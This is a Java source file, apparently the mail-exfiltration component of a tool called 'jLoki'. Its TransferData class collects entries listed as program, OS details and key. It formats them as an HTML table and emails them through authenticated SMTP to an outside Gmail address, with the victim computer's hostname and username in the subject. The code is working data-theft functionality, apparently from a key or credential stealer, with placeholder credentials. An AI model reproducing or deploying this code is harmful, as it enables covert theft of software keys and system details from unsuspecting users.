package me.jershdervis.jloki.mail;

import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Properties;

/**
 * Created by JershDervis on 28/07/2015.
 */
public class TransferData implements Runnable {

    private final ArrayList<String> compiledDataArray;

    public TransferData(ArrayList<String> dataArray) {
        this.compiledDataArray = dataArray;
    }

    @Override
    public void run() {
        final String username = "sender@mail.com";
        final String password = "senderPassword";

        Properties props = System.getProperties();
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.host", "smtp.mail.com");
        props.put("mail.smtp.port", "587");


        Session session = Session.getInstance(props,
                new javax.mail.Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(username, password);
                    }
                });

        try {
            StringBuilder messageBuilder = new StringBuilder();
            messageBuilder.append("<html>");

            messageBuilder.append("<table style=\"border-collapse:collapse;border-spacing:0;border-color:#bbb;margin:0px auto;\">");

            messageBuilder.append("<tr>");
            messageBuilder.append("<th style=\"" + this.getTableHeaderCss() + "\">Program</th>");
            messageBuilder.append("<th style=\"" + this.getTableHeaderCss() + "\">OS Details</th>");
            messageBuilder.append("<th style=\"" + this.getTableHeaderCss() + "\">Key</th>");
            messageBuilder.append("</tr>");

            for(String data : compiledDataArray) {
                messageBuilder.append("<tr>");
                String[] splitter = data.split(":");
                for(String currentDataValue : splitter) {
                    messageBuilder.append("<td style=\"font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-color:#bbb;color:#594F4F;background-color:#E0FFEB;border-top-width:1px;border-bottom-width:1px;\">"
                            + currentDataValue + "</td>");
                }
                messageBuilder.append("</tr>");
            }
            messageBuilder.append("</table>");
            messageBuilder.append("</html>");

            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(username));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse("receiver@gmail.com"));
            message.setSubject(this.getComputerName() + ": " + this.getUsername());
            message.setContent(messageBuilder.toString(), "text/html");

            Transport.send(message);
        } catch (MessagingException e) {
            throw new RuntimeException(e);
        }
    }

    private String getTableHeaderCss() {
        return "font-family:Arial, sans-serif;font-size:14px;font-weight:normal;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-color:#bbb;color:#493F3F;background-color:#9DE0AD;border-top-width:1px;border-bottom-width:1px;";
    }

    private String getComputerName() {
        try {
            return InetAddress.getLocalHost().getHostName();
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
        return null;
    }

    private String getUsername() {
        return System.getProperty("user.name");
    }
}
